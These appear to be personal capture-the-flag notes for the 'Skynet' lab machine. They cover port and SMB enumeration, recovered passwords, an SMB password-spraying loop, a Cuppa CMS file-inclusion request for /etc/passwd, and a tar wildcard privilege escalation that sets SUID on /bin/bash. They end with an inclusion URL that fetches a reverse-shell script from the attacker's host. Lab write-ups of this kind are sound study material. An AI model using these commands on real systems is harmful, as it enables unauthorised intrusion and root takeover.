```shell

ports:
	22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
	110/tcp open  pop3        Dovecot pop3d
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	143/tcp open  imap        Dovecot imapd
	445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) Host: SKYNET

smb-security-mode:
  account_used: guest
  authentication_level: user
  challenge_response: supported
  message_signing: disabled (dangerous, but default)
smb2-time:
  date: 2024-10-25T13:45:57
smb-os-discovery:
  OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  Computer name: skynet
  NetBIOS computer name: SKYNET\x00
  Domain name: \x00
  FQDN: skynet

paths:
	/admin                (Status: 301) [Size: 312] [--> http://10.10.183.22/admin/]
	/css                  (Status: 301) [Size: 310] [--> http://10.10.183.22/css/]
	/js                   (Status: 301) [Size: 309] [--> http://10.10.183.22/js/]
	/config               (Status: 301) [Size: 313] [--> http://10.10.183.22/config/]
	/ai                   (Status: 301) [Size: 309] [--> http://10.10.183.22/ai/]
	/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.183.22/squirrelmail/]

linux4enum:
	 =======================================( Users on 10.10.183.22 )=======================================
	index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:                                                                                                          user:[milesdyson] rid:[0x3e8]
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
	Reconnecting with SMB1 for workgroup listing.
        Server               Comment
        ---------            -------
        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

todo:
	ok - loook at paths - all forbidden except suqirrelmail (login form) ver 1.4.23 [SVN] js is visible in source code
	ok - look at the smb
	ok - look at the net-bios
	ok - try squrrelmail exploit (u have one user for now) prolly not ...
    ok - try login in smb for miles - works - Add features to beta CMS /45kra24zxs28v3yd (possible cms login password or cookie ?? or path ISA PATH DUD)
	 - try login as serenakogan@skynet in email 

info:
	php detected
	squirellmail ver 1.4.23
	couldn't get XSS SSRF or RCE to work manually.
	smb Server 10.10.183.22 allows sessions using username '', password ''		
	shares - print$ anonymous milesdyson IPC$
	in anon smb log1.txt contains login attempts i think, (another txt file, employees must change psws from miles)
	possible string in miles.jpg from /45kra... path CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	CMS : --> cuppacms.com

users:
	milesdyson:cyborg007haloterminator (ceo/boss, mail creds) smb creds: milesdyson:)s{A&2Z=F^n_E.B`
	serenakogan@skynet:pongterminator

notes:
	# this user probably exists usually i get access_denied as error msg
	┌──(kali㉿kali)-[~/ctf/skynet]
	└─$ while read -r line; do smbclient //10.10.183.22/milesdyson --user "milesdyson%$line" && echo "$line"; done < "log1.txt"
		session setup failed: NT_STATUS_LOGON_FAILURE
		session setup failed: NT_STATUS_LOGON_FAILURE
	Status: 200, Size: 1789, Words: 155, Lines: 30, Duration: 4585ms]
	
	'/></td><td><a class="forgot_password" onclick="ShowPanel('forget')">Forgot Password?</a></td>
	found this in html js source code of cms, trying to inject it as payload to reset password and use email of milesdyson
	according to an cve rce possible http://10.10.3.131/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd

lessons learned:
	ffuf in this instace for bruteforcing with wordlist of log1.txt didn't work out well, squirrelmail is slow as fuck, and that prolly made it a miss.
	when stuck in dead end on new path just bruteforce it. or use your brain and if you came to that path thru note mentioning cms consider /administrator page u dumdum
	the html injection I was trying good thinking but, kinda overlooked a very simple "none" to "block" change in display arg.
	Which shows the new field for password reset, which for some reason did not work.
	***
	/bin/bash binary that is owned by a root user can be used as a privesc instead of creating new rev shell.
	The idea being if there is a way to run commands with high privileges, we can set SUID of the /bin/bash binary which means -
	We can run /bin/bash -p command, which runs the bin with privs of the user who owns the bin (in this case root).
	Now the way we get to the command which will set the SUID of the /bin/bash is another story, in this case...
	
	Using the bash script of user miles which runs as root and can be read by us, uses * wildcard for archiving stuff in /www/data/html dir.
	As the tar parses *, aka every filename in the dir, if we plant a file with name that starts with -- tar will interpret it as an option argument for tar.
	Now this is where you use gugel and look up how to use this information, gtfobins etc.

	printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh                     
	echo "" > "--checkpoint-action=exec=sh shell.sh"
	echo "" > "--checkpoint-action=exec=sh shell.sh"                        
	echo "" > --checkpoint=1
	/bin/bash -p

found:
	www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator$ cat Conf
<ra24zxs28v3yd/administrator$ cat Configuration.php                   
<?php 
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "password123";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        } 
root user login on localhost + token + upload file path

tried this...
SSRF url injection with local host as url to the same path as for the reverse shell
http://10.10.200.98/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://localhost/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.163.154:8000/revs.php

```